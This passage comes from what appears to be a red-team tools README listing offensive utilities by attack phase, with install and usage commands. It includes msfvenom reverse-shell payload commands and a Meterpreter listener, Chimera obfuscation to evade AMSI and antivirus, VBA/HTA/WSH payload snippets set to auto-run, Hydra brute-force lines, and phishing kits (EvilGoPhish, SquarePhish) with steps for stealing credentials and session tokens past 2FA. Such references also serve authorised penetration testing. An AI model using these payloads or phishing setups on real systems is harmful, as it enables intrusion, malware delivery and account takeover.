&lt;li&gt;&lt;code&gt;Click &#39;Add Page&#39;&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;Paste the above Javascript in the &#39;url&#39; box&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;Click &#39;Save&#39;&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;...then visit the victim page in the browser and click the bookmarklet.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/207563211-6c69711a-f7e7-4451-862b-80c9849df7fe.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage (Console)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Paste the above Javascript into the console window &lt;code&gt;F12&lt;/code&gt; and press enter.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/207563598-d70171b5-823e-491e-a6d5-8657af28b0e5.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/projectdiscovery/nuclei&#34;&gt;nuclei&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;Fast vulnerability scanner that uses .yaml templates to search for specific issues.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cat domains.txt | nuclei -t /PATH/nuclei-templates/&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/205439027-2afe4ef8-fc7a-410d-934f-f8d325a8176e.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/A-poc/certSniff&#34;&gt;certSniff&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;certSniff is a Certificate Transparency logs keyword watcher I wrote in Python. It uses the certstream library to watch for certificate creation logs that contain keywords, defined in a file.&lt;/p&gt; &#xA;&lt;p&gt;You can set this running with several keywords relating to your victim domain, any certificate creations will be recorded and may lead to the discovery of domains you were previously unaware of.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/A-poc/certSniff;cd certSniff/;pip install -r requirements.txt&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;python3 certSniff.py -f example.txt&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/206023792-ef251912-00c0-48e1-8691-71438cf7dd11.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://www.kali.org/tools/gobuster/&#34;&gt;gobuster&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;Nice tool for brute forcing file/folder paths on a victim website.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo apt install gobuster&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gobuster dir -u &#34;https://google.com&#34; -w /usr/share/wordlists/dirb/big.txt --wildcard -b 301,401,403,404,500 -t 20&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/192146594-86f04a85-fce3-4c4c-bcd6-2bf6a6222241.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://www.kali.org/tools/dnsrecon/#dnsrecon&#34;&gt;dnsrecon&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;dnsrecon is a pyhton tool for enumerating DNS records (MX, SOA, NS, A, AAAA, SPF and TXT) and can provide a number of new associated victim hosts to pivot into from a single domain search.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo apt install dnsrecon&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;dnsrecon -d google.com&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/191689049-624db340-8adb-4a97-be8d-b7177f409a8b.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://www.shodan.io/dashboard&#34;&gt;shodan.io&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;Shodan crawls public infrastructure and displays it in a searchable format. Using a company name, domain name, IP address it is possible to discover potentially vulnerable systems relating to your target via shodan.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/191689282-70f99fe9-aa08-4cd3-b881-764eface8546.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/D3Ext/AORT&#34;&gt;AORT&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;Tool for enumerating subdomains, enumerating DNS, WAF detection, WHOIS, port scan, wayback machine, email harvesting.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/D3Ext/AORT; cd AORT; pip3 install -r requirements.txt&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;python3 AORT.py -d google.com&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/192070398-aae0217d-69c4-460b-ae4c-51b045551268.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/BishopFox/spoofcheck&#34;&gt;spoofcheck&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;A program that checks if a domain can be spoofed from. The program checks SPF and DMARC records for weak configurations that allow spoofing. Additionally it will alert if the domain has DMARC configuration that sends mail or HTTP requests on failed SPF/DKIM emails.&lt;/p&gt; &#xA;&lt;p&gt;Domains are spoofable if any of the following conditions are met:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Lack of an SPF or DMARC record&lt;/li&gt; &#xA; &lt;li&gt;SPF record never specifies &lt;code&gt;~all&lt;/code&gt; or &lt;code&gt;-all&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;DMARC policy is set to &lt;code&gt;p=none&lt;/code&gt; or is nonexistent&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/BishopFox/spoofcheck; cd spoofcheck; pip install -r requirements.txt&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;./spoofcheck.py [DOMAIN]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/208209744-dfff6dd6-f53c-41a2-b3b7-bfc6bfb9b521.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/jordanpotti/AWSBucketDump&#34;&gt;AWSBucketDump&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;AWSBucketDump is a tool to quickly enumerate AWS S3 buckets to look for interesting files. It&#39;s similar to a subdomain bruteforcer but is made specifically for S3 buckets and also has some extra features that allow you to grep for files, as well as download interesting files.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;git clone https://github.com/jordanpotti/AWSBucketDump; cd AWSBucketDump; pip install -r requirements.txt&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;usage: AWSBucketDump.py [-h] [-D] [-t THREADS] -l HOSTLIST [-g GREPWORDS] [-m MAXSIZE]&#xA;&#xA;optional arguments:&#xA;  -h, --help    show this help message and exit&#xA;  -D            Download files. This requires significant diskspace&#xA;  -d            If set to 1 or True, create directories for each host w/ results&#xA;  -t THREADS    number of threads&#xA;  -l HOSTLIST&#xA;  -g GREPWORDS  Provide a wordlist to grep for&#xA;  -m MAXSIZE    Maximum file size to download.&#xA;&#xA; python AWSBucketDump.py -l BucketNames.txt -g interesting_Keywords.txt -D -m 500000 -d 1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/metac0rtex/GitHarvester&#34;&gt;GitHarvester&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;Nice tool for finding information from GitHub with regex, with the ability to search specific GitHub users and/or projects.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;git clone https://github.com/metac0rtex/GitHarvester; cd GitHarvester&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;./githarvester.py&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/dxa4481/truffleHog&#34;&gt;truffleHog&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;TruffleHog is a tool that scans git repositories and looks for high-entropy strings and patterns that may indicate the presence of secrets, such as passwords and API keys. With TruffleHog, you can quickly and easily find sensitive information that may have been accidentally committed and pushed to a repository.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install (Binaries):&lt;/strong&gt; &lt;a href=&#34;https://github.com/trufflesecurity/trufflehog/releases&#34;&gt;Link&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install (Go):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;git clone https://github.com/trufflesecurity/trufflehog.git; cd trufflehog; go install&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;trufflehog https://github.com/trufflesecurity/test_keys&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/208212273-137cb6ef-b0e6-42f7-8fd3-ac6a5cfe6a40.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Resource Development&lt;/h1&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/tokyoneon/Chimera&#34;&gt;Chimera&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;Chimera is a PowerShell obfuscation script designed to bypass AMSI and antivirus solutions. It digests malicious PS1&#39;s known to trigger AV and uses string substitution and variable concatenation to evade common detection signatures.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo apt-get update &amp;amp;&amp;amp; sudo apt-get install -Vy sed xxd libc-bin curl jq perl gawk grep coreutils git&#xA;sudo git clone https://github.com/tokyoneon/chimera /opt/chimera&#xA;sudo chown $USER:$USER -R /opt/chimera/; cd /opt/chimera/&#xA;sudo chmod +x chimera.sh; ./chimera.sh --help&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;./chimera.sh -f shells/Invoke-PowerShellTcp.ps1 -l 3 -o /tmp/chimera.ps1 -v -t powershell,windows,\&#xA;copyright -c -i -h -s length,get-location,ascii,stop,close,getstream -b new-object,reverse,\&#xA;invoke-expression,out-string,write-error -j -g -k -r -p&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/209867736-5c35cec0-9227-4f18-a439-a5c954342818.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://www.offensive-security.com/metasploit-unleashed/Msfvenom/&#34;&gt;msfvenom&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;Msfvenom allows the creation of payloads for various operating systems in a wide range of formats. It also supports obfuscation of payloads for AV bypass.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Set Up Listener&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;use exploit/multi/handler &#xA;set PAYLOAD windows/meterpreter/reverse_tcp &#xA;set LHOST your-ip &#xA;set LPORT listening-port &#xA;run&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Msfvenom Commands&lt;/h4&gt; &#xA;&lt;p&gt;&lt;strong&gt;PHP:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;msfvenom -p php/meterpreter/reverse_tcp lhost =192.168.0.9 lport=1234 R&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Windows:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;msfvenom -p windows/shell/reverse_tcp LHOST=&amp;lt;IP&amp;gt; LPORT=&amp;lt;PORT&amp;gt; -f exe &amp;gt; shell-x86.exe&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Linux:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;msfvenom -p linux/x86/shell/reverse_tcp LHOST=&amp;lt;IP&amp;gt; LPORT=&amp;lt;PORT&amp;gt; -f elf &amp;gt; shell-x86.elf&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Java:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;msfvenom -p java/jsp_shell_reverse_tcp LHOST=&amp;lt;IP&amp;gt; LPORT=&amp;lt;PORT&amp;gt; -f raw &amp;gt; shell.jsp&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;HTA:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.3 lport=443 -f hta-psh &amp;gt; shell.hta&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/192070870-2e65fc9f-6534-42e2-af27-9d8b54a82f0b.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;WSH&lt;/h3&gt; &#xA;&lt;p&gt;&lt;strong&gt;Creating payload:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-vbs&#34;&gt;Set shell = WScript.CreateObject(&#34;Wscript.Shell&#34;)&#xA;shell.Run(&#34;C:\Windows\System32\calc.exe &#34; &amp;amp; WScript.ScriptFullName),0,True&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Execute:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;wscript payload.vbs&#xA;cscript.exe payload.vbs&#xA;wscript /e:VBScript payload.txt //If .vbs files are blacklisted&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;HTA&lt;/h3&gt; &#xA;&lt;p&gt;&lt;strong&gt;Creating payload:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;html&amp;gt;&#xA;&amp;lt;body&amp;gt;&#xA;&amp;lt;script&amp;gt;&#xA;&#x9;var c= &#39;cmd.exe&#39;&#xA;&#x9;new ActiveXObject(&#39;WScript.Shell&#39;).Run(c);&#xA;&amp;lt;/script&amp;gt;&#xA;&amp;lt;/body&amp;gt;&#xA;&amp;lt;/html&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Execute:&lt;/strong&gt; Run file&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;VBA&lt;/h3&gt; &#xA;&lt;p&gt;&lt;strong&gt;Creating payload:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;Sub calc()&#xA;&#x9;Dim payload As String&#xA;&#x9;payload = &#34;calc.exe&#34;&#xA;&#x9;CreateObject(&#34;Wscript.Shell&#34;).Run payload,0&#xA;End Sub&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Execute:&lt;/strong&gt; Set function to Auto_Open() in macro enabled document&lt;/p&gt; &#xA;&lt;h1&gt;Initial Access&lt;/h1&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://shop.hak5.org/products/bash-bunny&#34;&gt;Bash Bunny&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;The Bash Bunny is a physical USB attack tool and multi-function payload delivery system. It is designed to be plugged into a computer&#39;s USB port and can be programmed to perform a variety of functions, including manipulating and exfiltrating data, installing malware, and bypassing security measures.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://hackinglab.cz/en/blog/bash-bunny-guide/&#34;&gt;hackinglab: Bash Bunny â€“ Guide&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://docs.hak5.org/bash-bunny/&#34;&gt;Hak5 Documentation&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/hak5/bashbunny-payloads&#34;&gt;Nice Payload Repo&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://hak5.org/products/bash-bunny&#34;&gt;Product Page&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/209868292-cc02ce20-7d8e-4019-b953-7082fb0eb828.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/fin3ss3g0d/evilgophish&#34;&gt;EvilGoPhish&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;evilginx2 + gophish. (GoPhish) Gophish is a powerful, open-source phishing framework that makes it easy to test your organization&#39;s exposure to phishing. (evilginx2) Standalone man-in-the-middle attack framework used for phishing login credentials along with session cookies, allowing for the bypass of 2-factor authentication&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/fin3ss3g0d/evilgophish&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Usage:&#xA;./setup &amp;lt;root domain&amp;gt; &amp;lt;subdomain(s)&amp;gt; &amp;lt;root domain bool&amp;gt; &amp;lt;redirect url&amp;gt; &amp;lt;feed bool&amp;gt; &amp;lt;rid replacement&amp;gt; &amp;lt;blacklist bool&amp;gt;&#xA; - root domain                     - the root domain to be used for the campaign&#xA; - subdomains                      - a space separated list of evilginx2 subdomains, can be one if only one&#xA; - root domain bool                - true or false to proxy root domain to evilginx2&#xA; - redirect url                    - URL to redirect unauthorized Apache requests&#xA; - feed bool                       - true or false if you plan to use the live feed&#xA; - rid replacement                 - replace the gophish default &#34;rid&#34; in phishing URLs with this value&#xA; - blacklist bool                  - true or false to use Apache blacklist&#xA;Example:&#xA;  ./setup.sh example.com &#34;accounts myaccount&#34; false https://redirect.com/ true user_id false&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/191007680-890acda1-72ec-429e-9c91-b2cae55d7189.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/IO1337/social-engineering-toolkit&#34;&gt;Social Engineer Toolkit (SET)&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;This framework is great for creating campaigns for initial access, &#39;SET has a number of custom attack vectors that allow you to make a believable attack quickly&#39;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/IO1337/social-engineering-toolkit; cd set; python setup.py install&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;python3 setoolkit&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/191690233-e1f4255a-514e-4887-94da-b8a3396025f0.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/vanhauser-thc/thc-hydra&#34;&gt;Hydra&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;Nice tool for logon brute force attacks. Can bf a number of services including SSH, FTP, TELNET, HTTP etc.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo apt install hydra&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;hydra -L USER.TXT -P PASS.TXT 1.1.1.1 http-post-form &#34;login.php:username-^USER^&amp;amp;password=^PASS^:Error&#34;&#xA;hydra -L USER.TXT -P PASS.TXT 1.1.1.1 ssh&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/193459614-365876d5-09da-4f29-b850-0480944f0097.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/secureworks/squarephish&#34;&gt;SquarePhish&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;SquarePhish is an advanced phishing tool that uses a technique combining OAuth Device code authentication flow and QR codes (See &lt;a href=&#34;https://github.com/secureworks/PhishInSuits&#34;&gt;PhishInSuits&lt;/a&gt; for more about OAuth Device Code flow for phishing attacks).&lt;/p&gt; &#xA;&lt;p&gt;Attack Steps:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Send malicious QR code to victim&lt;/li&gt; &#xA; &lt;li&gt;Victim scans QR code with mobile device&lt;/li&gt; &#xA; &lt;li&gt;Victim directed to attacker controlled server (Triggering OAuth Device Code authentication flow process)&lt;/li&gt; &#xA; &lt;li&gt;Victim emailed MFA code (Triggering OAuth Device Code flow 15 minute timer)&lt;/li&gt; &#xA; &lt;li&gt;Attacker polls for authentication&lt;/li&gt; &#xA; &lt;li&gt;Victim enters code into legit Microsoft website&lt;/li&gt; &#xA; &lt;li&gt;Attacker saves authentication token&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/secureworks/squarephish; cd squarephish; pip install -r requirements.txt&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; &lt;em&gt;Before using either module, update the required information in the settings.config file noted with &lt;code&gt;Required&lt;/code&gt;.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage (Email Module):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;usage: squish.py email [-h] [-c CONFIG] [--debug] [-e EMAIL]&#xA;&#xA;optional arguments:&#xA;  -h, --help            show this help message and exit&#xA;&#xA;  -c CONFIG, --config CONFIG&#xA;                        squarephish config file [Default: settings.config]&#xA;&#xA;  --debug               enable server debugging&#xA;&#xA;  -e EMAIL, --email EMAIL&#xA;                        victim email address to send initial QR code email to&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage (Server Module):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;usage: squish.py server [-h] [-c CONFIG] [--debug]&#xA;&#xA;optional arguments:&#xA;  -h, --help            show this help message and exit&#xA;&#xA;  -c 